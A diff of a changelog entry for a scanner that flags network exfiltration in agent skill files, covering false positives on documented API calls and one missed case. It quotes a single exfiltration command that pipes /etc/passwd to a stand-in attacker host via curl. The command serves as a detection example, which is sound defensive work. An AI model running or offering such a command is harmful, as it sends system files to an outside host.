@@ -1,4 +1,4 @@
-### Fixed — `--scan-skills` net-exfil names the host a `$VAR` holds, and a credential sent to a local host is WARN (#353, thanks @toasterbook88)
+### Fixed — `--scan-skills` net-exfil names the host a `$VAR` holds, and some credential variables sent to a local host are WARN (#353, thanks @toasterbook88)
 
 @toasterbook88 scanned a 2,077-file skills tree and read every one of the 107 `EXFILTRATE:net-exfil` rows by hand. They found that the rule fired per line on a network verb plus any `$VAR`, so `BASE_URL=https://api.cloudflare.com/…` three lines up was invisible, and documented API calls read like exfiltration. They then froze a classifier (`classify107.sh`) and published a corrected histogram: about 89 of the 107 were documented service-API calls, and the six that carried a credential all sent it to the service that owns it. They also found the miss the rule is named for: `cat /etc/passwd | curl https://evil.com --data-binary @-` scanned clean. The 0.6.x severity fix made that CRITICAL, and a network verb with no destination stopped firing. This entry adds the flow-based part promised then.
 
